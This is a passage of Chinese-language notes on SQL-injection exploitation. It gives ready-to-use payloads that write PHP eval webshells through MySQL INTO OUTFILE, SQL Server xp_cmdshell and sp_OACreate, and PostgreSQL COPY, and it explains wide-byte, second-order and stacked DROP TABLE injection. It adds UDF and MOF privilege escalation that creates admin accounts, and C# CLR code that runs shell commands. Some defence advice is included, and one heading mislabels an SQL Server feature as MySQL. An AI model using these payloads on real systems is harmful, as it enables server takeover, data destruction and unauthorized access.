<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 假设我们想写入一个名为 shell.php 的文件   </span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; UNION SELECT 1, &#x27;</span><span class="operator">&lt;</span>?php eval($_POST[cmd]);?<span class="operator">&gt;</span><span class="string">&#x27; INTO OUTFILE &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>shell.php<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong></p>
<ul>
<li><p><code>INTO OUTFILE</code> 导出时会以行的形式输出，每行末尾会有换行符，且不能覆盖已有文件。为了解决这个问题，通常会结合十六进制编码或 <code>LOAD_FILE()</code> 来绕过</p>
</li>
<li><p>为了避免转义和换行问题，WebShell 代码通常会用十六进制进行编码</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; UNION SELECT 1, 0x3c3f706870206576616c28245f504f53545b636d645d293b3f3e INTO OUTFILE &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>shell.php<span class="string">&#x27;--+   </span></span><br></pre></td></tr></table></figure>

<p><strong>2. SQL Server：</strong><code>xp_cmdshell</code><br><code>xp_cmdshell</code> 是 SQL Server 的一个扩展存储过程，它允许在数据库中执行操作系统命令。如果它被启用，攻击者就可以直接执行命令来写入 WebShell</p>
<h4 id="利用步骤："><a href="#利用步骤：" class="headerlink" title="利用步骤："></a><strong>利用步骤：</strong></h4><p><strong>判断</strong> <code>xp_cmdshell</code> <strong>是否启用</strong>：默认情况下，<code>xp_cmdshell</code> 是禁用的</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;dir c:&#x27;</span><span class="comment">-- </span></span><br></pre></td></tr></table></figure>

<p>如果执行成功，说明已启用。如果没有，则需要尝试启用它</p>
<p><strong>启用</strong> <code>xp_cmdshell</code>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>; RECONFIGURE; <span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>; RECONFIGURE<span class="comment">--   </span></span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> 启用 <code>xp_cmdshell</code> 需要较高的权限（通常是 <code>sysadmin</code> 角色）</p>
<ol>
<li><strong>写入 WebShell</strong>：启用 <code>xp_cmdshell</code> 后，可以使用 <code>echo</code> 命令将 WebShell 代码写入文件</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">EXEC</span> xp_cmdshell <span class="string">&#x27;echo ^&lt;^?php eval($_POST[cmd])?^&gt; &gt; C:\inetpub\wwwroot\shell.asp&#x27;</span><span class="comment">--   </span></span><br></pre></td></tr></table></figure>

<p><code>^</code> 是为了转义特殊字符 <code>&lt;</code>、<code>&gt;</code> 等</p>
<p><strong>3. SQL Server：</strong><code>sp_OACreate</code></p>
<p>如果 <code>xp_cmdshell</code> 被禁用，攻击者还可以利用 <code>sp_OACreate</code> 等 OLE 自动化存储过程来执行命令</p>
<ul>
<li><strong>利用方式</strong>：利用 <code>sp_OACreate</code> 创建一个 <code>WScript.Shell</code> 对象，然后通过其 <code>Run</code> 方法执行命令</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="keyword">DECLARE</span> <span class="variable">@o</span> <span class="type">INT</span>; <span class="keyword">EXEC</span> sp_OACreate <span class="string">&#x27;WScript.Shell&#x27;</span>, <span class="variable">@o</span> <span class="keyword">OUT</span>; <span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@o</span>, <span class="string">&#x27;Run&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;cmd.exe /c echo ^&lt;^?php eval($_POST[cmd])?^&gt; &gt; C:\inetpub\wwwroot\shell.asp&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>



<p><strong>4. PostgreSQL：</strong><code>COPY TO</code></p>
<p>PostgreSQL 提供了 <code>COPY TO</code> 命令，用于将表数据导出到文件中</p>
<p>*<em>利用方式</em><br>创建一个临时表，并将 WebShell 代码插入其中<br>利用 <code>COPY TO</code> 命令将数据导出到目标文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; CREATE TABLE shell (cmd text); INSERT INTO shell VALUES (&#x27;</span><span class="operator">&lt;</span>?php eval($_POST[cmd]);?<span class="operator">&gt;</span><span class="string">&#x27;); COPY shell TO &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>shell.php<span class="string">&#x27;;--</span></span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong> 执行 <code>COPY</code> 命令需要 <code>superuser</code> 权限，且目标路径必须是数据库服务器可读写的</p>
<h2 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h2><p>php的<code>addslashes()</code> 或 <code>mysql_real_escape_string()</code> 等函数来对单引号进行转义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">&#x27;</span><br><span class="line">转义</span><br><span class="line">\&#x27;</span><br><span class="line">SQL 查询：</span><br><span class="line">SELECT * FROM users WHERE id = &#x27;1\&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">这句 SQL 语句是不合法的，因为 `\&#x27;` 被视为一个转义后的单引号，从而导致查询失败，注入被阻止</span><br></pre></td></tr></table></figure>

<p>是因为当后端数据库使用GBK时，我们可以用一个特殊字符来吃掉转义字符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">%df</span><br><span class="line"></span><br><span class="line">输入</span><br><span class="line">id=1%df</span><br><span class="line"></span><br><span class="line">URL解码后： id=1&#x27; （这里  是 0xdf 的GBK编码，具体字符取决于浏览器）</span><br><span class="line"></span><br><span class="line">addslashes() 处理后： addslashes() 只会将单引号 &#x27; 转义成 \&#x27;。 此时，字符串变为 1%df\&#x27;</span><br><span class="line"></span><br><span class="line">在内存中，它的十六进制表示是： 31 25 64 66 5c 27</span><br></pre></td></tr></table></figure>

<p>MySQL 在接收到这个字符串时，会把它当作 GBK 编码进行解析。它会发现 <code>%df</code>（<code>0xdf</code>）是一个宽字节的开头，并且紧接着的 <code>\</code>（<code>0x5c</code>）恰好在GBK编码的合法范围内，可以和 <code>0xdf</code> 组成一个合法的汉字</p>
<ul>
<li><p><code>%df%5c</code> (<code>0xdf</code> 和 <code>0x5c</code>) 在GBK编码中是一个合法的汉字，例如“運”</p>
</li>
<li><p><strong>结果：</strong> <code>1%df\&#39;</code> 在数据库看来就变成了 <code>1</code> + <strong>一个汉字</strong> + <code>&#39;</code></p>
</li>
<li><p><strong>最终的 SQL 查询：</strong> <code>SELECT * FROM users WHERE id = &#39;1運&#39;&#39;</code></p>
</li>
</ul>
<p>此时，被转义的单引号 <code>&#39;</code> 重新获得了生命，因为它不再被认为是转义符的一部分。攻击者就可以继续使用后面的单引号进行SQL注入</p>
<h3 id="二次注入漏洞原理"><a href="#二次注入漏洞原理" class="headerlink" title="二次注入漏洞原理"></a>二次注入漏洞原理</h3><p>我们通过一个经典的案例来解释这个过程<br>假设有一个网站，允许用户注册并修改个人信息，其中包含用户名<br><strong>第一阶段：数据注入</strong></p>
<ol>
<li><p><strong>用户注册</strong>：注册时，应用对用户名进行了严格的过滤，阻止了单引号和一些 SQL 关键字</p>
</li>
<li><p><strong>攻击者构造恶意用户名</strong>：攻击者注册一个名为 <code>test&#39; and 1=1--</code> 的账户。由于注册时的过滤机制，攻击者无法直接注入</p>
</li>
<li><p><strong>攻击者换一种方式</strong>：攻击者注册一个名为 <code>test</code> 的账户。然后，在修改用户名的功能中，他将用户名修改为 <code>test&#39; and 1=1--</code></p>
</li>
<li><p><strong>应用处理</strong>：假设应用在<strong>更新操作</strong>时对用户输入做了严格的过滤，但数据库中的<strong>新增操作</strong>没有。攻击者在第一次新增时，输入一个看似无害的用户名，例如 <code>test</code></p>
</li>
</ol>
<p><strong>漏洞的真正利用</strong>：<br>现在，假设应用有一个功能，允许用户修改自己的个人信息，而这个功能在设计时存在缺陷</p>
<ul>
<li><strong>正常的修改用户信息 SQL 语句</strong>：</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> users <span class="keyword">SET</span> email <span class="operator">=</span> <span class="string">&#x27;user@example.com&#x27;</span> <span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>攻击者如何利用</strong>：</li>
</ul>
<ol>
<li><p><strong>第一次注入</strong>：攻击者注册一个名为 <code>test</code> 的账户。这个数据被安全地存储在数据库中</p>
</li>
<li><p><strong>第二次注入</strong>：攻击者找到一个功能，例如“修改评论”，而这个功能会将评论内容与用户名关联起来。假设评论表是 <code>comments</code>，并且 <code>username</code> 列没有做任何过滤</p>
</li>
</ol>
<p>攻击者提交了一条评论，内容为 <code>&#39; or 1=1--</code>。数据库执行了如下语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT INTO</span> comments (username, content) <span class="keyword">VALUES</span> (<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--&#x27;);</span></span><br></pre></td></tr></table></figure>

<p>此时，恶意数据 <code>&#39; or 1=1--</code> 被安全地存储在了 <code>comments</code> 表中</p>
<ol>
<li><strong>触发漏洞</strong>：现在，应用中有一个<strong>管理员审核评论</strong>的功能。管理员点击审核按钮后，后端会执行一个不安全的查询，例如：</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> comments <span class="keyword">WHERE</span> content <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--&#x27;;</span></span><br></pre></td></tr></table></figure>

<p>这条查询语句由于没有对 <code>content</code> 字段进行二次过滤，导致 <code>or 1=1--</code> 被当作 SQL 语句的一部分，从而绕过了原本的逻辑，直接获取了 <code>comments</code> 表中的所有数据，甚至可以被进一步利用进行数据泄露或篡改</p>
<h2 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h2><p>假设一个网站的查询语句是这样拼接的：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;用户输入&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>如果用户输入 <code>1</code>，执行的 SQL 语句就是：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><strong>堆叠注入攻击</strong></p>
<p>如果攻击者在输入框中输入 <code>1; DROP TABLE users</code>，并且后端没有过滤分号，最终执行的 SQL 语句就会变成：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> users;</span><br></pre></td></tr></table></figure>

<p>数据库服务器会按顺序执行这两条语句。第一条是正常的查询，第二条则是<strong>删除</strong> <code>users</code> <strong>表</strong>的恶意命令</p>
<h2 id="MySQL提权"><a href="#MySQL提权" class="headerlink" title="MySQL提权"></a>MySQL提权</h2><h4 id="UDF-提权（User-Defined-Function，用户自定义函数提权）"><a href="#UDF-提权（User-Defined-Function，用户自定义函数提权）" class="headerlink" title="UDF 提权（User-Defined Function，用户自定义函数提权）"></a>UDF 提权（User-Defined Function，用户自定义函数提权）</h4><p>UDF 提权是 MySQL 提权场景中最经典、应用最广泛的方式之一。其核心原理是利用 MySQL 支持加载自定义函数（UDF）的特性 —— 用户可通过 C&#x2F;C++ 编写包含系统命令执行逻辑的动态库文件，将其加载到 MySQL 中并注册为自定义函数，从而突破数据库层面限制，执行操作系统命令实现提权。<br><strong>前提条件</strong></p>
<ol>
<li><p><strong>权限要求</strong>：当前 MySQL 账户必须具备 <code>CREATE FUNCTION</code>（创建自定义函数）和 <code>FILE</code>（文件读写）权限，若需加载插件形式的 UDF 还需 <code>SUPER</code> 权限（MySQL 5.1 及以上版本）；</p>
</li>
<li><p><strong>路径与权限要求</strong>：需知晓 MySQL 插件目录（可通过 <code>show variables like &#39;%plugin_dir%&#39;;</code> 查询），且该目录对 MySQL 进程具备可写权限；</p>
</li>
<li><p><strong>版本适配</strong>：UDF 库文件需与 MySQL 版本、服务器系统架构（32&#x2F;64 位）匹配（如 Linux 对应 <code>.so</code> 文件，Windows 对应 <code>.dll</code> 文件）。<br><strong>攻击步骤</strong><br><strong>步骤 1：上传恶意 UDF 库文件</strong></p>
</li>
</ol>
<p>攻击者通过 SQL 注入、文件写入漏洞（如 <code>SELECT ... INTO OUTFILE</code>），将预编译的恶意 UDF 动态库文件（如 Linux 下的 <code>lib_mysqludf_sys.so</code>、Windows 下的 <code>mysqludf.dll</code>）写入 MySQL 插件目录：</p>
<ul>
<li><p>Linux 典型插件目录：<code>/usr/lib/mysql/plugin/</code>（不同发行版可能为 <code>/usr/lib64/mysql/plugin/</code>）；</p>
</li>
<li><p>Windows 典型插件目录：<code>C:\Program Files\MySQL\MySQL Server\版本号\lib\plugin\</code>。<br>文件写入示例（Linux）：</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-- 利用 FILE 权限将 UDF 库文件写入插件目录（需先通过 hex 编码规避字符过滤）</span><br><span class="line">SELECT 0x7F454C46...（UDF文件十六进制内容） INTO DUMPFILE &#x27;/usr/lib/mysql/plugin/lib_mysqludf_sys.so&#x27;;</span><br></pre></td></tr></table></figure>

<p>十六进制可以看另一篇文章<a target="_blank" rel="noopener" href="https://www.sqlsec.com/udf/">MySQL UDF 提权十六进制查询 | 国光</a></p>
<p><strong>步骤 2：注册恶意自定义函数</strong></p>
<p>通过 <code>CREATE FUNCTION</code> 语句，将 UDF 库中的系统命令执行函数（如 <code>sys_exec</code>、<code>sys_eval</code>）注册为 MySQL 可调用函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-- 注册 sys_eval 函数（执行系统命令并返回输出结果）</span><br><span class="line">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;lib_mysqludf_sys.so&#x27;;</span><br><span class="line">-- 注册 sys_exec 函数（执行系统命令，无返回结果，适合创建用户、启动服务等操作）</span><br><span class="line">CREATE FUNCTION sys_exec RETURNS INT SONAME &#x27;lib_mysqludf_sys.so&#x27;;</span><br></pre></td></tr></table></figure>

<p><strong>步骤 3：执行系统命令实现提权</strong></p>
<p>调用已注册的恶意函数，执行任意系统命令，获取操作系统层面的高权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-- 查看当前执行命令的用户（验证提权基础）</span><br><span class="line">SELECT sys_eval(&#x27;whoami&#x27;);</span><br><span class="line">-- Linux 下添加 root 权限用户</span><br><span class="line">SELECT sys_eval(&#x27;useradd -m -s /bin/bash hackuser &amp;&amp; echo &quot;hackuser:123456&quot; | chpasswd&#x27;);</span><br><span class="line">-- Windows 下添加管理员用户</span><br><span class="line">SELECT sys_eval(&#x27;net user hackuser 123456 /add &amp;&amp; net localgroup administrators hackuser /add&#x27;);</span><br></pre></td></tr></table></figure>

<p><strong>防御方法</strong></p>
<ol>
<li><p><strong>最小权限原则</strong>：严格限制 MySQL 账户权限，普通业务账户仅授予 <code>SELECT/INSERT/UPDATE/DELETE</code> 等必要权限，禁止授予 <code>FILE</code>、<code>CREATE FUNCTION</code>、<code>SUPER</code> 等高权限；</p>
</li>
<li><p><strong>加固文件读写配置</strong>：修改 MySQL 配置文件 <code>my.cnf</code>（Linux）&#x2F;<code>my.ini</code>（Windows），设置 <code>secure_file_priv</code> 为指定安全目录（如 <code>secure_file_priv = /tmp/mysql_file/</code>）或 <code>NULL</code>（完全禁止文件导入导出），重启 MySQL 生效；</p>
</li>
<li><p><strong>限制插件目录权限</strong>：将 MySQL 插件目录的写入权限仅开放给 root 用户，禁止 MySQL 进程账户（如 <code>mysql</code> 用户）修改该目录内容；</p>
</li>
<li><p><strong>定期审计</strong>：检查 <code>mysql.func</code> 表（存储自定义函数），及时清理非授权的 UDF 函数；</p>
</li>
<li><p><strong>版本升级</strong>：升级至 MySQL 8.0+ 版本，该版本对 UDF 加载增加了更严格的权限和路径校验。</p>
</li>
</ol>
<h4 id="MOF-提权（Managed-Object-Format，托管对象格式提权）"><a href="#MOF-提权（Managed-Object-Format，托管对象格式提权）" class="headerlink" title="MOF 提权（Managed Object Format，托管对象格式提权）"></a>MOF 提权（Managed Object Format，托管对象格式提权）</h4><p>只针对Windows管用，利用 Windows 系统 WMI（Windows 管理规范）服务的配置缺陷，特定版本的 Windows 系统会自动加载并执行 <code>%systemroot%\system32\wbem\mof</code> 目录下的 MOF 文件，攻击者通过 MySQL 的文件写入权限将恶意 MOF 文件写入该目录，触发系统执行命令实现提权<br><strong>Windows 自动执行 MOF 文件的核心原因?</strong><br><code>%systemroot%\system32\wbem\mof</code> 是 Windows 为 WMI 预留的 默认类定义目录，系统自动执行该目录下的 MOF 文件，本质是为了 初始化 WMI 功能，具体逻辑如下：<br>简化系统管理与类注册，自动触发，无需手动干预</p>
<ul>
<li><p>WMI 本身只提供 “管理框架”，但 “能管理哪些资源”（比如进程、服务、磁盘）需要通过 “类定义” 来告知 WMI。</p>
</li>
<li><p>微软将常用的系统管理类（如 <code>Win32_Process</code>、<code>Win32_Service</code>）以 MOF 文件的形式预置于 <code>mof</code> 目录（比如系统自带的 <code>wbemcons.mof</code>、<code>cimwin32.mof</code>）。</p>
</li>
<li><p>系统启动时，<code>Winmgmt</code> 服务会自动扫描该目录，调用 <code>mofcomp.exe</code> 编译所有 MOF 文件，将类注册到 WMI 仓库 —— 这样 WMI 才能正常提供管理功能（比如用户用 <code>wmic process list</code> 查询进程时，就能识别 <code>Win32_Process</code> 类）。<br><strong>执行时机：自动触发，无需手动干预</strong></p>
</li>
<li><p>系统启动时（<code>Winmgmt</code> 服务启动）；</p>
</li>
<li><p><code>Winmgmt</code> 服务重启时；</p>
</li>
<li><p>手动将 MOF 文件复制到该目录后（部分系统会实时监控目录变化）。<br><strong>这个目录是 WMI 的 “类定义加载目录”，系统自动执行其中的 MOF 文件，是为了让 WMI 获得管理系统所需的 “元数据”</strong><br><strong>前提条件</strong></p>
</li>
</ul>
<ol>
<li><p><strong>系统环境</strong>：仅适用于 Windows Server 2003&#x2F;2008（Windows 7&#x2F;2012 及以上版本已修复该缺陷）；</p>
</li>
<li><p><strong>权限要求</strong>：MySQL 账户需具备 <code>FILE</code> 权限，可执行 <code>SELECT ... INTO OUTFILE</code> 写入文件；</p>
</li>
<li><p><strong>路径权限</strong>：MySQL 进程账户需对 <code>%systemroot%\system32\wbem\mof</code> 目录具备写入权限。<br><strong>攻击步骤</strong></p>
</li>
</ol>
<p><strong>步骤1：写恶意MOF文件</strong><br>MOF 文件是 WMI 的元数据定义文件，攻击者编写包含系统命令执行逻辑的 MOF 文件（核心是通过 <code>__EventFilter</code>、<code>__EventConsumer</code> 等 WMI 类绑定事件，触发命令执行），示例核心内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line">instance of __EventFilter as $EventFilter &#123;</span><br><span class="line">    Name = &quot;MyFilter&quot;;</span><br><span class="line">    EventNamespace = &quot;Root\\CIMV2&quot;;</span><br><span class="line">    Query = &quot;SELECT * FROM __InstanceModificationEvent WHERE TargetInstance ISA &#x27;Win32_LocalTime&#x27; AND TargetInstance.Second = 0&quot;;</span><br><span class="line">    QueryLanguage = &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer &#123;</span><br><span class="line">    Name = &quot;MyConsumer&quot;;</span><br><span class="line">    ScriptingEngine = &quot;VBScript&quot;;</span><br><span class="line">    ScriptText = &quot;Set objShell = CreateObject(\&quot;WScript.Shell\&quot;)\nobjShell.Run(\&quot;net user hackuser 123456 /add &amp; net localgroup administrators hackuser /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding as $Binding &#123;</span><br><span class="line">    Consumer = $Consumer;</span><br><span class="line">    Filter = $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上述 MOF 文件的作用：系统每分钟（秒数为 0 时）触发 VBScript 脚本，创建名为 <code>hackuser</code> 的管理员账户。<br><strong>步骤 2：写入恶意 MOF 文件</strong></p>
<p>利用 MySQL 的 <code>FILE</code> 权限，将恶意 MOF 文件写入 Windows 系统的指定目录：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 将 MOF 内容写入 %systemroot%\system32\wbem\mof 目录（需替换为实际系统路径）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)...&#x27;</span>（MOF 文件内容） <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;C:\\WINDOWS\\system32\\wbem\\mof\\hack.mof&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><strong>步骤 3：触发 MOF 文件执行</strong></p>
<p>Windows 的 CIMOM（Common Information Model Object Manager）服务会周期性扫描 <code>%systemroot%\system32\wbem\mof</code> 目录，自动加载并执行新写入的 MOF 文件。一旦文件被加载，其中的命令会立即或按设定周期执行，攻击者即可获得系统管理员权限。</p>
<p><strong>防御方法</strong></p>
<ol>
<li><p><strong>核心权限管控</strong>：禁止 MySQL 账户获取 <code>FILE</code> 权限，从源头阻止文件写入；</p>
</li>
<li><p><strong>系统版本升级</strong>：将 Windows 服务器升级至 Windows Server 2012 及以上版本，该版本修复了 MOF 文件自动执行的缺陷；</p>
</li>
<li><p><strong>目录权限加固</strong>：限制 <code>%systemroot%\system32\wbem\mof</code> 目录的写入权限，仅允许 SYSTEM 和 Administrators 组修改；</p>
</li>
<li><p><strong>监控 WMI 事件</strong>：开启 Windows 系统的 WMI 事件审计，及时发现非授权的 MOF 文件加载和事件绑定操作。</p>
</li>
</ol>
<p><strong>总结</strong></p>
<ol>
<li><p>UDF 提权跨平台（Linux&#x2F;Windows），核心依赖 MySQL 的自定义函数加载和文件读写权限，防御重点是权限管控和配置加固；</p>
</li>
<li><p>MOF 提权仅适用于老旧 Windows 系统，核心利用 WMI 服务的自动加载机制，防御重点是系统升级和目录权限限制；</p>
</li>
<li><p>两种提权方式的核心防御共性：遵循最小权限原则，严格限制 MySQL 账户的高风险权限，定期审计系统和数据库的非授权操作。</p>
</li>
</ol>
<h2 id="MySQL-的-xp-cmdshell-函数被禁用怎么绕过"><a href="#MySQL-的-xp-cmdshell-函数被禁用怎么绕过" class="headerlink" title="MySQL 的 xp_cmdshell() 函数被禁用怎么绕过"></a>MySQL 的 xp_cmdshell() 函数被禁用怎么绕过</h2><ol>
<li><strong>利用其他扩展存储过程</strong><br>MSSQL 中还有一些其他的扩展存储过程，它们可能没有 xp_cmdshell 那么直接，但仍然可以用于执行命令或读写文件。</li>
</ol>
<p>sp_OACreate（OLE Automation Procedures）<br>该过程通常用于创建 COM 对象，若能找到合适的 COM 对象（如 WScript.Shell），可利用其执行命令。</p>
<p><strong>示例代码</strong>：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> <span class="variable">@shell</span> <span class="type">INT</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OACreate <span class="string">&#x27;WScript.Shell&#x27;</span>, <span class="variable">@shell</span> <span class="keyword">OUT</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_OAMethod <span class="variable">@shell</span>, <span class="string">&#x27;run&#x27;</span>, <span class="keyword">NULL</span>, <span class="string">&#x27;cmd.exe /c whoami &gt; C:\temp\output.txt&#x27;</span>;</span><br><span class="line"><span class="comment">-- 之后你可以读取 output.txt 来获取结果</span></span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：这种方法依赖于是否启用了 OLE Automation Procedures，并且需要寻找可以被利用的 COM 对象。</p>
<ol>
<li><strong>SQL Server Agent Jobs</strong><br>若 SQL Server Agent 服务正在运行，且你拥有创建作业的权限，可创建新的 Agent Job，在其中执行 PowerShell 或命令行脚本。</li>
</ol>
<p><strong>攻击步骤</strong></p>
<ol start="2">
<li><strong>创建作业（Job）</strong>：创建一个 SQL Agent Job，步骤类型（Step Type）选择 Operating system (CmdExec) 或 PowerShell；</li>
<li><strong>编写脚本</strong>：在步骤中直接写入要执行的命令；</li>
<li><strong>启动作业</strong>：启动该作业，命令会在 SQL Server Agent 的权限下执行。</li>
</ol>
<p><strong>说明</strong>：这种方法的好处是，即使 xp_cmdshell 被禁用，Agent Job 依然可以运行。但前提是，你有权限创建并执行作业。</p>
<ol>
<li><strong>CLR Assembly</strong><br>SQL Server 提供了 CLR（Common Language Runtime）集成功能，允许在数据库中运行 .NET 代码。若能创建恶意的 CLR Assembly，并在其中编写执行命令的代码，可绕过 xp_cmdshell。</li>
</ol>
<p>操作步骤</p>
<ol>
<li><strong>启用 CLR</strong></li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;clr enabled&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure>

<ol>
<li><strong>创建并部署 Assembly</strong><br>编写 C# 代码（使用 System.Diagnostics.Process 类执行命令），编译成 DLL 后上传到数据库；再创建 SQL 存储过程调用 Assembly 中的方法。</li>
</ol>
<p><strong>C# 代码示例</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Data.SqlClient;</span><br><span class="line">using Microsoft.SqlServer.Server;</span><br><span class="line"></span><br><span class="line">public class StoredProcedures</span><br><span class="line">&#123;</span><br><span class="line">[SqlProcedure]</span><br><span class="line">public static void CmdExec(string command)</span><br><span class="line">&#123;</span><br><span class="line">Process.Start(&quot;cmd.exe&quot;, &quot;/c &quot; + command);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

